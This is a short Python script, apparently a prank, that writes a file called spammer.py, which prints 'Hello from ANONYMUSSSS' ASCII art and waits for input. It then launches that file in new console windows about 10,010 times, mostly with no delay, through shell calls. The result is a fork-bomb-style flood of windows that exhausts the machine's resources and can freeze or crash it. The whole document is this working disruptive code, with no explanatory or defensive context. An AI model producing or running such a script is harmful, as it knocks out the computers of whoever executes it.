from subprocess import *
import time, os

if os.path.isfile("spammer.py"):
    os.remove("spammer.py")

spammer = open("spammer.py", "w+")

spammer.write("print('''               _    _      _ _          __                      \n")
spammer.write("              | |  | |    | | |        / _|                    \n")
spammer.write("              | |__| | ___| | | ___   | |_ _ __ ___  _ __ ___  \n")
spammer.write("              |  __  |/ _ \ | |/ _ \  |  _| '__/ _ \| '_ ` _ \ \n")
spammer.write("              | |  | |  __/ | | (_) | | | | | | (_) | | | | | |\n")
spammer.write("              |_|  |_|\___|_|_|\___/  |_| |_|  \___/|_| |_| |_|''')\n")

spammer.write("print('''  /$$$$$$  /$$   /$$  /$$$$$$  /$$   /$$ /$$     /$$ /$$      /$$ /$$   /$$  /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$ \n")
spammer.write(" /$$__  $$| $$$ | $$ /$$__  $$| $$$ | $$|  $$   /$$/| $$$    /$$$| $$  | $$ /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$ \n")
spammer.write("| $$  \ $$| $$$$| $$| $$  \ $$| $$$$| $$ \  $$ /$$/ | $$$$  /$$$$| $$  | $$| $$  \__/| $$  \__/| $$  \__/| $$  \__/ \n")
spammer.write("| $$$$$$$$| $$ $$ $$| $$  | $$| $$ $$ $$  \  $$$$/  | $$ $$/$$ $$| $$  | $$|  $$$$$$ |  $$$$$$ |  $$$$$$ |  $$$$$$ \n")
spammer.write("| $$__  $$| $$  $$$$| $$  | $$| $$  $$$$   \  $$/   | $$  $$$| $$| $$  | $$ \____  $$ \____  $$ \____  $$ \____  $$\n")
spammer.write("| $$  | $$| $$\  $$$| $$  | $$| $$\  $$$    | $$    | $$\  $ | $$| $$  | $$ /$$  \ $$ /$$  \ $$ /$$  \ $$ /$$  \ $$\n")
spammer.write("| $$  | $$| $$ \  $$|  $$$$$$/| $$ \  $$    | $$    | $$ \/  | $$|  $$$$$$/|  $$$$$$/|  $$$$$$/|  $$$$$$/|  $$$$$$/\n")
spammer.write("|__/  |__/|__/  \__/ \______/ |__/  \__/    |__/    |__/     |__/ \______/  \______/  \______/  \______/  \______/ ''')\n")

spammer.write("input()")

spammer.close()

for i in range(10):
    call('start python spammer.py', shell=True)
    time.sleep(1)

for i in range(10000):
    call('start python spammer.py', shell=True)
